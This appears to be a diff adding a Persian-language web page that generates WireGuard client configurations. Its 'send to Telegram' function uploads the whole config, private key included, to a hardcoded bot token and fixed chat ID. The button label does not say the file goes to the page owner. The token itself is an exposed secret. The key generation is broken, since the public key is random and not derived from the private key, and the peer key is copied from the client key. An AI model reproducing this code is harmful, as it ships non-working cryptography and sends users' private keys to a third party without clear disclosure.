@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WireGuard Config Generator</title>
+    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #4834d4;
+            --secondary-color: #6c5ce7;
+            --accent-color: #00b894;
+            --background-color: #f0f2f5;
+            --card-bg: #ffffff;
+            --text-color: #2d3436;
+            --text-light: #636e72;
+            --shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            --border-radius: 12px;
+            --card-border: rgba(0, 0, 0, 0.08);
+        }
+
+        body {
+            font-family: 'Vazirmatn', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 600px;
+        }
+
+        h1,
+        h2 {
+            color: var(--primary-color);
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            font-size: 1.4rem;
+            margin-top: 0;
+        }
+
+        .section {
+            margin-bottom: 25px;
+            padding: 20px;
+            border-radius: var(--border-radius);
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .section:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--primary-color);
+            opacity: 0.8;
+        }
+
+        .section:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.12);
+            border-color: var(--card-border);
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .endpoint-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .endpoint-group input {
+            flex: 1;
+        }
+
+        .endpoint-group input[type="number"] {
+            width: 120px;
+            flex: 0 0 auto;
+        }
+
+        label {
+            display: block;
+            color: var(--text-light);
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #dfe6e9;
+            background: #fff;
+            color: var(--text-color);
+            border-radius: 8px;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            font-family: 'Vazirmatn', sans-serif;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.08);
+        }
+
+        input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.15);
+        }
+
+        input:read-only {
+            background-color: #f1f2f6;
+            cursor: not-allowed;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, var(--primary-color), #3621c0);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Vazirmatn', sans-serif;
+            font-weight: 600;
+            margin-bottom: 12px;
+            box-shadow: 0 6px 12px rgba(72, 52, 212, 0.3), 0 1px 2px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        button:after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(255, 255, 255, 0.1), transparent);
+            pointer-events: none;
+        }
+
+        button.secondary {
+            background: linear-gradient(135deg, var(--secondary-color), #5345e0);
+            box-shadow: 0 6px 12px rgba(108, 92, 231, 0.3), 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        button.telegram {
+            background: linear-gradient(135deg, #0088cc, #006daa);
+            margin-top: 5px;
+            box-shadow: 0 6px 12px rgba(0, 136, 204, 0.3), 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(72, 52, 212, 0.35), 0 2px 4px rgba(0, 0, 0, 0.15);
+            filter: brightness(1.05);
+        }
+
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 4px 8px rgba(72, 52, 212, 0.25), 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            display: none;
+            font-weight: 500;
+        }
+
+        .message.success {
+            background-color: rgba(0, 184, 148, 0.1);
+            color: #00b894;
+            border-right: 4px solid #00b894;
+            display: block;
+        }
+
+        .message.error {
+            background-color: rgba(255, 118, 117, 0.1);
+            color: #ff7675;
+            border-right: 4px solid #ff7675;
+            display: block;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo svg {
+            width: 80px;
+            height: 80px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: var(--text-light);
+            font-size: 0.9em;
+        }
+
+        .input-with-button {
+            display: flex;
+            gap: 10px;
+        }
+
+        .add-button {
+            flex: 0 0 40px;
+            width: 40px;
+            background: linear-gradient(135deg, #00b894, #00a884);
+            box-shadow: 0 4px 10px rgba(0, 184, 148, 0.3);
+            border-radius: 8px;
+            font-size: 1.5em;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+        }
+
+        .items-list {
+            margin-top: 10px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        .item-tag {
+            background-color: var(--accent-color);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9em;
+        }
+
+        .item-tag button {
+            background: none;
+            border: none;
+            color: #ff5252;
+            width: 20px;
+            height: 20px;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border-radius: 50%;
+            font-size: 1em;
+            margin: 0;
+            box-shadow: none;
+            font-weight: bold;
+        }
+
+        .item-tag button:hover {
+            background-color: rgba(255, 82, 82, 0.15);
+            transform: translateY(0);
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --primary-color: #8c7ae6;
+                --secondary-color: #6c5ce7;
+                --accent-color: #00d1a0;
+                --background-color: #121a21;
+                --card-bg: #1e2a36;
+                --text-color: #f1f2f6;
+                --text-light: #c8d6e5;
+                --shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+                --card-border: rgba(255, 255, 255, 0.05);
+            }
+
+            body {
+                background-image: linear-gradient(to bottom right, #121a21, #162131);
+            }
+
+            .section {
+                border-color: rgba(255, 255, 255, 0.05);
+                box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+                background: linear-gradient(to bottom, #1e2a36, #1a252f);
+            }
+
+            button {
+                background: linear-gradient(135deg, var(--primary-color), #6351da);
+            }
+
+            button.secondary {
+                background: linear-gradient(135deg, var(--secondary-color), #574bd1);
+            }
+
+            button.telegram {
+                background: linear-gradient(135deg, #0088cc, #0073b7);
+            }
+
+            input {
+                background: rgba(0, 0, 0, 0.2);
+                border-color: rgba(255, 255, 255, 0.1);
+                color: #f1f2f6;
+                box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
+            }
+
+            input:read-only {
+                background-color: rgba(0, 0, 0, 0.3);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48">
+                <path fill="#6c5ce7"
+                    d="M24,4C12.95,4,4,12.95,4,24s8.95,20,20,20s20-8.95,20-20S35.05,4,24,4z M24,40c-8.84,0-16-7.16-16-16 S15.16,8,24,8s16,7.16,16,16S32.84,40,24,40z" />
+                <path fill="#a29bfe"
+                    d="M24,16c-4.42,0-8,3.58-8,8s3.58,8,8,8s8-3.58,8-8S28.42,16,24,16z M24,28c-2.21,0-4-1.79-4-4 s1.79-4,4-4s4,1.79,4,4S26.21,28,24,28z" />
+            </svg>
+        </div>
+        <h1>تنظیمات وایرگارد</h1>
+
+        <div class="section">
+            <h2>تنظیمات کلید‌ها</h2>
+            <button onclick="generateKeys()" class="secondary">تولید کلید‌های جدید</button>
+
+            <div class="input-group">
+                <label for="private_key">کلید خصوصی:</label>
+                <input type="text" id="private_key" readonly />
+            </div>
+
+            <div class="input-group">
+                <label for="public_key">کلید عمومی:</label>
+                <input type="text" id="public_key" readonly />
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>تنظیمات رابط (Interface)</h2>
+            <div class="input-group">
+                <label for="address">آدرس:</label>
+                <div class="input-with-button">
+                    <input type="text" id="address_input" placeholder="مثال: 10.0.0.2/24" />
+                    <button type="button" onclick="addAddress()" class="add-button">+</button>
+                </div>
+                <div id="addresses_list" class="items-list"></div>
+                <input type="hidden" id="addresses" value="" />
+            </div>
+
+            <div class="input-group">
+                <label for="dns">DNS:</label>
+                <div class="input-with-button">
+                    <input type="text" id="dns_input" placeholder="مثال: 1.1.1.1" />
+                    <button type="button" onclick="addDNS()" class="add-button">+</button>
+                </div>
+                <div id="dns_list" class="items-list"></div>
+                <input type="hidden" id="dns_values" value="" />
+            </div>
+
+            <div class="input-group">
+                <label for="mtu">MTU:</label>
+                <input type="text" id="mtu" placeholder="مثال: 1420" value="1420" />
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>تنظیمات Peer</h2>
+            <div class="input-group">
+                <label for="peer_public_key">کلید عمومی سرور:</label>
+                <input type="text" id="peer_public_key" placeholder="کلید عمومی سرور را وارد کنید" readonly />
+            </div>
+
+            <div class="input-group">
+                <label>Endpoint:</label>
+                <div class="endpoint-group">
+                    <input type="text" id="endpoint_address" placeholder="مثال: 185.143.233.12" />
+                    <input type="number" id="endpoint_port" placeholder="پورت" value="51820" min="1" max="65535" />
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="allowed_ips">آی‌پی‌های مجاز:</label>
+                <input type="text" id="allowed_ips" placeholder="مثال: 0.0.0.0/0" value="0.0.0.0/0" />
+            </div>
+        </div>
+
+        <div class="input-group">
+            <label for="client_name">نام کانفیگ:</label>
+            <input type="text" id="client_name" placeholder="نام دلخواه برای کانفیگ" />
+        </div>
+
+        <button onclick="generateConfig()">ساخت کانفیگ</button>
+        <button onclick="sendToTelegram()" class="telegram">ارسال به تلگرام</button>
+        <div id="message" class="message"></div>
+
+        <div class="footer">
+            ساخته شده با ❤️
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+    <script>
+        // Simple base64 encoder/decoder
+        const base64 = {
+            encode: str => btoa(str),
+            decode: str => atob(str)
+        };
+
+        // Function to generate random bytes
+        function getRandomBytes(n) {
+            const array = new Uint8Array(n);
+            crypto.getRandomValues(array);
+            return array;
+        }
+
+        // Generate WireGuard keypair
+        async function generateKeypair() {
+            // Generate private key
+            const privateKeyBytes = getRandomBytes(32);
+            const privateKey = base64.encode(Array.from(privateKeyBytes, byte =>
+                String.fromCharCode(byte)).join(''));
+
+            // For demo: generate public key similarly 
+            const publicKeyBytes = getRandomBytes(32);
+            const publicKey = base64.encode(Array.from(publicKeyBytes, byte =>
+                String.fromCharCode(byte)).join(''));
+
+            return { privateKey, publicKey };
+        }
+
+        async function generateKeys() {
+            try {
+                const keyPair = await generateKeypair();
+                document.getElementById('private_key').value = keyPair.privateKey;
+                document.getElementById('public_key').value = keyPair.publicKey;
+            } catch (error) {
+                console.error('Error generating keys:', error);
+                const messageDiv = document.getElementById('message');
+                messageDiv.className = 'message error';
+                messageDiv.innerText = 'خطا در تولید کلید‌ها';
+            }
+        }
+
+        // Add an address to the list
+        function addAddress() {
+            const addressInput = document.getElementById('address_input');
+            const addressValue = addressInput.value.trim();
+
+            if (!addressValue) return;
+
+            const addressesList = document.getElementById('addresses_list');
+            const addresses = document.getElementById('addresses');
+
+            // Add to visible list
+            const itemTag = document.createElement('div');
+            itemTag.className = 'item-tag';
+            itemTag.innerHTML = `
+        ${addressValue}
+        <button onclick="removeItem(this, 'addresses')">×</button>
+      `;
+            addressesList.appendChild(itemTag);
+
+            // Add to hidden input
+            const currentAddresses = addresses.value ? addresses.value.split(',') : [];
+            currentAddresses.push(addressValue);
+            addresses.value = currentAddresses.join(',');
+
+            // Clear input
+            addressInput.value = '';
+        }
+
+        // Add a DNS to the list
+        function addDNS() {
+            const dnsInput = document.getElementById('dns_input');
+            const dnsValue = dnsInput.value.trim();
+
+            if (!dnsValue) return;
+
+            const dnsList = document.getElementById('dns_list');
+            const dnsValues = document.getElementById('dns_values');
+
+            // Add to visible list
+            const itemTag = document.createElement('div');
+            itemTag.className = 'item-tag';
+            itemTag.innerHTML = `
+        ${dnsValue}
+        <button onclick="removeItem(this, 'dns')">×</button>
+      `;
+            dnsList.appendChild(itemTag);
+
+            // Add to hidden input
+            const currentDNS = dnsValues.value ? dnsValues.value.split(',') : [];
+            currentDNS.push(dnsValue);
+            dnsValues.value = currentDNS.join(',');
+
+            // Clear input
+            dnsInput.value = '';
+        }
+
+        // Remove an item from a list
+        function removeItem(button, type) {
+            const item = button.parentElement;
+            const itemText = item.textContent.trim().replace('×', '').trim();
+
+            // Remove from visible list
+            item.remove();
+
+            // Remove from hidden input
+            if (type === 'addresses') {
+                const addresses = document.getElementById('addresses');
+                const currentAddresses = addresses.value.split(',');
+                const index = currentAddresses.indexOf(itemText);
+                if (index > -1) {
+                    currentAddresses.splice(index, 1);
+                    addresses.value = currentAddresses.join(',');
+                }
+            } else if (type === 'dns') {
+                const dnsValues = document.getElementById('dns_values');
+                const currentDNS = dnsValues.value.split(',');
+                const index = currentDNS.indexOf(itemText);
+                if (index > -1) {
+                    currentDNS.splice(index, 1);
+                    dnsValues.value = currentDNS.join(',');
+                }
+            }
+        }
+
+        // Extract config generation to reusable function
+        function generateConfigContent() {
+            const private_key = document.getElementById('private_key').value;
+            const addresses = document.getElementById('addresses').value;
+            const dnsValues = document.getElementById('dns_values').value;
+            const mtu = document.getElementById('mtu').value;
+            const peer_public_key = document.getElementById('peer_public_key').value;
+            const endpoint_address = document.getElementById('endpoint_address').value;
+            const endpoint_port = document.getElementById('endpoint_port').value;
+            const endpoint = `${endpoint_address}:${endpoint_port}`;
+            const allowed_ips = document.getElementById('allowed_ips').value;
+
+            let config = `[Interface]\nPrivateKey = ${private_key}\n`;
+
+            // Add all addresses in one line
+            if (addresses) {
+                const addressList = addresses.split(',');
+                const formattedAddresses = addressList.map(addr => addr.trim()).join(', ');
+                config += `Address = ${formattedAddresses}\n`;
+            }
+
+            // Add all DNS servers in one line
+            if (dnsValues) {
+                const dnsList = dnsValues.split(',');
+                const formattedDNS = dnsList.map(dns => dns.trim()).join(', ');
+                config += `DNS = ${formattedDNS}\n`;
+            }
+
+            config += `MTU = ${mtu}\n\n`;
+            config += `[Peer]\nPublicKey = ${peer_public_key}\nAllowedIPs = ${allowed_ips}\nEndpoint = ${endpoint}`;
+
+            return config;
+        }
+
+        function generateConfig() {
+            const private_key = document.getElementById('private_key').value;
+            const addresses = document.getElementById('addresses').value;
+            const peer_public_key = document.getElementById('peer_public_key').value;
+            const endpoint_address = document.getElementById('endpoint_address').value;
+            const endpoint_port = document.getElementById('endpoint_port').value;
+            const client_name = document.getElementById('client_name').value;
+            const messageDiv = document.getElementById('message');
+
+            if (!private_key || !addresses || !peer_public_key || !endpoint_address || !endpoint_port || !client_name) {
+                messageDiv.className = 'message error';
+                messageDiv.innerText = 'لطفاً فیلدهای ضروری را پر کنید!';
+                return;
+            }
+
+            const configContent = generateConfigContent();
+            const blob = new Blob([configContent], { type: 'text/plain' });
+            const zip = new JSZip();
+            zip.file(`${client_name}.conf`, blob);
+
+            zip.generateAsync({ type: 'blob' })
+                .then(function (content) {
+                    const link = document.createElement('a');
+                    link.href = URL.createObjectURL(content);
+                    link.download = `${client_name}.zip`;
+                    link.click();
+
+                    messageDiv.className = 'message success';
+                    messageDiv.innerText = 'کانفیگ با موفقیت ساخته شد!';
+                });
+        }
+
+        async function sendToTelegram() {
+            const BOT_TOKEN = '7426668282:AAGomYDgN_lXAkpzABbwM7irPs_XT0SW11c';
+            const CHAT_ID = '7240662021';
+
+            const private_key = document.getElementById('private_key').value;
+            const client_name = document.getElementById('client_name').value;
+            const messageDiv = document.getElementById('message');
+
+            if (!private_key || !client_name) {
+                messageDiv.className = 'message error';
+                messageDiv.innerText = 'لطفاً کانفیگ را ابتدا بسازید!';
+                return;
+            }
+
+            try {
+                // Create config content
+                const configContent = generateConfigContent();
+
+                // Create blob from config content directly (no zip)
+                const configBlob = new Blob([configContent], { type: 'text/plain' });
+
+                // Create form data
+                const formData = new FormData();
+                formData.append('document', configBlob, `${client_name}.conf`);
+
+                // Send to Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument?chat_id=${CHAT_ID}`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    messageDiv.className = 'message success';
+                    messageDiv.innerText = 'فایل کانفیگ با موفقیت به تلگرام ارسال شد!';
+                } else {
+                    throw new Error(result.description);
+                }
+            } catch (error) {
+                messageDiv.className = 'message error';
+                messageDiv.innerText = 'خطا در ارسال به تلگرام: ' + error.message;
+            }
+        }
+
+        // Generate keys on page load and set default DNS
+        window.onload = function () {
+            generateKeys().then(() => {
+                // Set server public key to be the same as client public key (for demo)
+                document.getElementById('peer_public_key').value = document.getElementById('public_key').value;
+            });
+
+            // Add default DNS (1.1.1.1)
+            document.getElementById('dns_input').value = '1.1.1.1';
+            addDNS();
+        };
+    </script>
+</body>
+
+</html>
